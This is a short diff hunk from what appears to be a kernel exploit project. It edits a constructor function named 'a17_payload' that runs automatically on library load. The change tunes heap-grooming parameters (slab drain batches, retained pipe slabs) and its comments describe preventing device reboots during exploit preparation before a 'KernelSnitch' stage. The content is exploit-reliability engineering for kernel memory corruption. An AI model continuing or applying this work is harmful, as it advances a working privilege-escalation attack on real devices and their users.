@@ -87,6 +87,10 @@ __attribute__((constructor)) static void a17_payload(void) {
    * repeated mm_struct slab churn. */
   setenv("GL_SLAB_DRAIN_BATCH", "24", 1);
   setenv("GL_SLAB_DRAIN_WAVES", "8", 1);
+  /* The initial pipe reclaim otherwise retains 800 mm-backed proc mem fds
+   * before KernelSnitch runs.  CZG1 has rebooted inside that preparation;
+   * halve its retained slab pressure while keeping ample grooming depth. */
+  setenv("GL_PIPE_PREP_SLABS", "16", 1);
   /* A connected miss leaves deliberately retained carrier pages behind.
    * Re-reclaiming inside the same process reuses that dirty state and has
    * rebooted CZG1 at the second outer prime.  Return cleanly after one outer;
